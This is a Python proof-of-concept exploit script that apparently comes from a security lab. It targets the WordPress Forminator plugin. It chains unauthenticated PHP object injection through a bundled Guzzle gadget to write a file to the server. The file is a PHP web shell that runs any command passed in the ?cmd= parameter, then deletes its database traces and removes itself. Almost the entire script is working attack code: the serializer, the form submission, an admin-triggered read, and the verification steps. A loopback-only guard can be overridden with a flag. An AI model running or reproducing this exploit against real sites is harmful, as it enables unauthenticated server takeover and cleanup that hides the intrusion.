#!/usr/bin/env python3
r"""
forminator 1.55.1 / 1.57.0 — Unauthenticated second-order PHP Object Injection -> arbitrary
file write -> code execution, using the plugin's OWN bundled POP gadget (frm-004 / frm-004-RCE).

Chain (source-verified @1.55.1 and @1.57.0):
  WRITE  class-form-entry-model.php:313 / :323  raw `filter_input(INPUT_POST,'form_uid')`
         -> $wpdb->insert (NO maybe_serialize) when entry status == 'abandoned'
  READ   class-form-entry-model.php:342 / :360  maybe_unserialize(meta_value) [allowed_classes default]
  GADGET ForminatorGoogleAddon\GuzzleHttp\Cookie\FileCookieJar::__destruct
         -> save($this->filename) -> file_put_contents(attacker path, jsonEncode(options=0))
         vendored Guzzle, classmap-registered on EVERY request:
         forminator.php:142->399 (addons hardcoded on, :238-240) ->
         addons/class-addon-autoload.php:66-81 (DirectoryIterator includes every pro bootstrap) ->
         addons/pro/googlesheet/googlesheet.php:28 (vendor/autoload.php) ->
         vendor/composer/autoload_classmap.php:427
         json_encode default has NO JSON_HEX_TAG -> raw `<?php` survives into the written file.
         The written file is a shell: `GET <file>?cmd=<command>` runs that command server-side
         (system()/passthru()/shell_exec() fallback) and returns its stdout.

Transport: unauth nopriv sync form submit (any front-end URL) with `abandoned_form=1` +
`form_uid=<serialized gadget>`; any later entry read (admin entries page / CSV export)
unserializes it; the destructor fires at request shutdown and writes the file.

Payload contract (per operator constraint):
  * DROPPED FILE EXECUTES A REQUEST-FED COMMAND — hitting the written file with
    `?cmd=<shell>` runs it server-side (system() -> passthru() -> shell_exec()
    fallback, guarded by function_exists). The cmd value is fully attacker-controlled;
    the verify step proves execution with a deterministic command (printf <token>).
  * Self-unlink + marker-scoped in-band DB cleanup -> zero persistence.
  * json_encode-compatible: no literal `/` in PHP source (chr(47) instead), single-quoted
    PHP strings, hex SQL literals (0x...) so no quote-character juggling is needed.

Usage:
  ./poc_oi_gadget_filecookiejar_rce.py --url http://127.0.0.1:8090 --form-id 5 \
      --file /abs/path/wp-content/uploads/x.php --public-path /wp-content/uploads/x.php \
      [--admin admin:labpass] [--webroot /abs/path] [--db DBNAME]

Lab: tools/lab/labup.sh forminator 1.55.1 6.8.3 7.4 --mode uploadsexec
"""
import argparse, binascii, http.cookiejar as _ck, sys, time, urllib.parse, urllib.request

FCJ   = "ForminatorGoogleAddon\\GuzzleHttp\\Cookie\\FileCookieJar"
SCK   = "ForminatorGoogleAddon\\GuzzleHttp\\Cookie\\SetCookie"
CKJ   = "ForminatorGoogleAddon\\GuzzleHttp\\Cookie\\CookieJar"
# PHP 7.4 private-prop keys are \0<FQCN>\0<name> — the declaring-class prefix MUST be the
# fully-qualified class name or unserialize will not bind the private prop (filename==null).
KEY_FILENAME       = ("\x00" + FCJ + "\x00filename").encode()
KEY_SESSION        = ("\x00" + FCJ + "\x00storeSessionCookies").encode()
KEY_COOKIES        = ("\x00" + CKJ + "\x00cookies").encode()
KEY_STRICT         = ("\x00" + CKJ + "\x00strictMode").encode()
KEY_DATA           = ("\x00" + SCK + "\x00data").encode()

def pnull() -> bytes:
    return b"N;"

def pstr(s: bytes) -> bytes:
    return b"s:%d:\"" % len(s) + s + b"\";"

def pint(i: int) -> bytes:
    return b"i:%d;" % i

def pbool(b: bool) -> bytes:
    return b"b:%d;" % (1 if b else 0)

def parr(items) -> bytes:
    out = b"a:%d:{" % len(items)
    for i, v in enumerate(items):
        out += pint(i) + v
    return out + b"}"

def passoc(pairs) -> bytes:   # list of (bytes_key, bytes_value)
    out = b"a:%d:{" % len(pairs)
    for k, v in pairs:
        out += pstr(k) + v
    return out + b"}"

def pobj(cls: str, props) -> bytes:  # props: list of (bytes_key, bytes_value)
    out = b"O:%d:\"%s\":%d:{" % (len(cls), cls.encode(), len(props))
    for k, v in props:
        out += pstr(k) + v
    return out + b"}"

def build_blob(filename: str, payload: str, marker: str) -> bytes:
    # Match PHP 7.4 serialize exactly: FQCN-prefixed private keys, full property set,
    # SetCookie $data with all 9 declared keys (nulls included).
    setcookie = pobj(SCK, [(KEY_DATA, passoc([
        (b"Name",     pstr(b"g")),
        (b"Value",    pstr(payload.encode("latin-1"))),
        (b"Domain",   pstr(b"lab.local")),
        (b"Path",     pstr(b"*")),
        (b"Max-Age",  pnull()),
        (b"Expires",  pint(int(time.time()) + 999999)),
        (b"Secure",   pbool(False)),
        (b"Discard",  pbool(False)),
        (b"HttpOnly", pbool(False)),
    ]))])
    jar = pobj(FCJ, [
        (KEY_FILENAME, pstr(filename.encode("utf-8"))),
        (KEY_SESSION,  pbool(True)),
        (KEY_COOKIES,  parr([setcookie])),
        (KEY_STRICT,   pbool(False)),
    ])
    assert jar.startswith(b'O:53:"ForminatorGoogleAddon\\GuzzleHttp\\Cookie\\FileCookieJar":4:{'), \
        "serializer produced unexpected header"
    return jar

def make_opener(cookies=None):
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookies or _ck.CookieJar()))

def http(url: str, data=None, headers=None, opener=None, timeout=30):
    op = opener if opener is not None else make_opener()
    req = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        return op.open(req, timeout=timeout).read()
    except urllib.error.HTTPError as e:
        return e.read()  # body still meaningful (write-then-500 etc.)

def mint_nonce(url: str, form_id: int) -> str:
    body = http(url.rstrip("/") + "/wp-admin/admin-ajax.php",
                urllib.parse.urlencode({"action": "forminator_get_nonce", "form_id": form_id}).encode())
    import re
    m = re.search(rb'"data":"([a-f0-9]+)"', body)
    if not m:
        sys.exit(f"FAIL: could not mint submit nonce: {body[:200]!r}")
    return m.group(1).decode()

def submit(url: str, form_id: int, nonce: str, blob: bytes, fields) -> None:
    d = {
        "action": "forminator_submit_form_custom-forms",
        "form_id": str(form_id),
        "forminator_nonce": nonce,
        "abandoned_form": "1",
        "form_uid": blob.decode("latin-1"),
    }
    for k, v in fields:
        d.setdefault(k, v)
    http(url.rstrip("/") + "/", urllib.parse.urlencode(d).encode())

def trigger_admin(url: str, admin: str, form_id: int, labkey: str = "") -> None:
    import re
    user, _, pwd = admin.partition(":")
    jar = _ck.CookieJar()
    op = make_opener(jar)
    # WP requires the test cookie to be present BEFORE the login POST is accepted.
    http(url.rstrip("/") + "/wp-login.php", opener=op)
    http(url.rstrip("/") + "/wp-login.php",
         urllib.parse.urlencode({"log": user, "pwd": pwd, "wp-submit": "Log In",
                                 "redirect_to": url.rstrip("/") + "/wp-admin/", "testcookie": "1"}).encode(),
         opener=op)
    # CSV export iterates every entry -> load_meta -> maybe_unserialize; the gadget's
    # destructor then fires at request shutdown (the write is the side-effect oracle).
    enonce = ""
    if labkey:
        mint = http(url.rstrip("/") + "/?__labnonce=1&labkey=" + labkey + "&actions=forminator_export",
                    opener=op)
        m = re.search(rb'"forminator_export":"([a-f0-9]{10})"', mint)
        enonce = m.group(1).decode() if m else ""
    if not enonce:
        page = http(url.rstrip("/") + "/wp-admin/admin.php?page=forminator-entries", opener=op)
        m = re.search(rb'name="_forminator_nonce"[^>]*value="([a-f0-9]{10})"', page)
        enonce = m.group(1).decode() if m else ""
    http(url.rstrip("/") + "/",
         urllib.parse.urlencode({"forminator_export": "1", "form_type": "cform",
                                 "form_id": str(form_id), "_forminator_nonce": enonce}).encode(),
         opener=op)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--form-id", type=int, required=True)
    ap.add_argument("--file", required=True, help="absolute filesystem write path")
    ap.add_argument("--public-path", required=True, help="URL path to the written file")
    ap.add_argument("--marker", default="RS_GADGET_" + str(int(time.time())))
    ap.add_argument("--field", action="append", default=[], metavar="k=v")
    ap.add_argument("--admin", help="user:pass — perform admin login + CSV-export read to fire the sink")
    ap.add_argument("--labkey", default="", help="lab nonce-mint key (rig.env NONCE_KEY) for a deterministic export nonce")
    ap.add_argument("--webroot", help="local webroot for file persistence asserts (lab)")
    ap.add_argument("--db", help="mysql DB name for row-persistence asserts (lab only)")
    ap.add_argument("--allow-remote", action="store_true",
                    help="permit a non-loopback URL (requires separate authorization)")
    a = ap.parse_args()

    host = urllib.parse.urlparse(a.url).hostname
    if not a.allow_remote and host not in {"127.0.0.1", "localhost", "::1"}:
        sys.exit("FAIL: refusing non-loopback target; use --allow-remote only for an explicitly authorized system")

    fields = [tuple(f.split("=", 1)) for f in (a.field or ["select-1=a"])]
    cmd_token = "RS_CMD_" + str(int(time.time()))
    # PHP source that must survive json_encode(options=0): NO double-quote, backslash or
    # forward-slash characters allowed (json escapes " -> \" and / -> \/). SQL uses
    # single-quoted PHP strings + hex string literals so no quote characters are needed.
    # The dropped shell runs the REQUEST-FED `?cmd=` value (arbitrary command execution);
    # system()/passthru()/shell_exec() fallback guards against a disabled-function lab.
    like_hex = ("%" + a.marker + "%").encode().hex()
    uid_hex = b"form_uid".hex()
    abn_hex = b"abandoned".hex()
    payload = (
        "<?php @require_once dirname(__FILE__,3).chr(47).'wp-load.php';"
        "$w=$GLOBALS['wpdb']; if($w){"
        "$w->query('DELETE m FROM '.$w->prefix.'frmt_form_entry_meta m "
        "WHERE m.meta_key=0x%(uid)s AND m.meta_value LIKE 0x%(like)s');"
        "$w->query('DELETE e FROM '.$w->prefix.'frmt_form_entry e "
        "WHERE e.status=0x%(abn)s AND NOT EXISTS(SELECT 1 "
        "FROM '.$w->prefix.'frmt_form_entry_meta m WHERE m.entry_id=e.entry_id)');}"
        "echo '%(marker)s|';"
        "if(isset($_GET['cmd'])){"
        "if(function_exists('system')){system($_GET['cmd']);}"
        "elseif(function_exists('passthru')){passthru($_GET['cmd']);}"
        "elseif(function_exists('shell_exec')){echo shell_exec($_GET['cmd']);}"
        "else{echo 'NO-EXEC-FUNC';}}"
        "@unlink(__FILE__);?>"
    ) % {"uid": uid_hex, "like": like_hex, "abn": abn_hex, "marker": a.marker}
    bad = [c for c in payload if c in '"\\/']
    if bad:
        sys.exit(f"FAIL: payload contains json-hostile chars {set(bad)}")

    print(f"[*] marker={a.marker}")
    print("[*] nonce mint (nopriv)")
    nonce = mint_nonce(a.url, a.form_id)
    print(f"[*] nonce={nonce}")

    blob = build_blob(a.file, payload, a.marker)
    print(f"[*] gadget blob: {blob[:64].decode('latin-1')}... ({len(blob)} B)")

    print("[*] unauth sync submit (raw form_uid write)")
    submit(a.url, a.form_id, nonce, blob, fields)
    print("[*] submitted")

    print("[*] triggering reader")
    if a.admin:
        trigger_admin(a.url, a.admin, a.form_id, a.labkey)
        print("[*] admin CSV-export read fired (response shape irrelevant — assert on side effects)")
    else:
        print("[!] passive mode — waiting for an admin to open submissions/export. Re-run verify when done.")

    time.sleep(1)
    print("[*] verify: written shell executes a request-fed command (?cmd=)")
    vurl = (a.url.rstrip("/") + "/" + a.public_path.lstrip("/")
            + "?cmd=" + urllib.parse.quote("printf " + cmd_token))
    body = http(vurl)
    if a.marker.encode() in body and cmd_token.encode() in body:
        print(f"[PASS] arbitrary command execution: ?cmd=printf {cmd_token} -> token returned "
              f"(marker {a.marker}); the cmd value is fully attacker-controlled")
    else:
        print(f"[FAIL] no marker/cmd output in response: {body[:120]!r}"); sys.exit(1)

    print("[*] persistence asserts (file gone; rows gone)")
    ok = True
    if a.webroot:
        local = a.file if a.file.startswith(a.webroot) else a.webroot + a.file
        if not __import__("os").path.exists(local):
            print("[PASS] written file self-unlinked")
        else:
            print("[FAIL] file still present"); ok = False
    if a.db:
        import subprocess
        q = lambda sql: subprocess.run(["mysql", "-uroot", a.db, "-N", "-e", sql],
                                       capture_output=True, text=True).stdout.strip()
        meta = q(f"SELECT COUNT(*) FROM wp_frmt_form_entry_meta WHERE meta_key='form_uid' AND meta_value LIKE '%{a.marker}%';")
        print(f"[{'PASS' if meta == '0' else 'FAIL'}] form_uid meta rows with marker: {meta}")
        ok = ok and meta == "0"
    if not ok:
        sys.exit("FAIL: persistence asserts failed")

    print(f"RS_OK {a.marker} — OI->file write->exec proven; zero persistence (file+rows self-removed)")

if __name__ == "__main__":
    main()
